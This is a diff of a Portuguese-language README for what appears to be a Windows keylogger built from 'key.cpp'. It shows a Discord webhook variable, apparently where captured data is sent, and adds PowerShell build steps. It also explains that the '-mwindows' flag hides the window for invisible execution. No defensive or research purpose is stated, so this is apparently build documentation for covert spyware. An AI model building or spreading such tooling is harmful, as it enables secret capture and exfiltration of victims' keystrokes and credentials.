@@ -46,11 +46,20 @@ const char* webHookDiscord = "SEUWEBHOOK=DISCORD.COM/QWDjAWDJAWJDAWJD";
 
 ---
 
+# 🔧 Build em PowerShell
+    CMD or PowerShell
+
+    .\build.ps1
+
+    laucher.exe
+
+---
+
 # 📄 Como funciona o comando:
 
-    key.cpp: O seu código-fonte principal.
+      key.cpp: O seu código-fonte principal.
 
-    -o KeyWin32: Define o nome do executável final.
+      -o KeyWin32: Define o nome do executável final.
 
-    -mwindows: Oculta a janela de prompt de comando (execução invisível).
+      -mwindows: Oculta a janela de prompt de comando (execução invisível).
 </div>
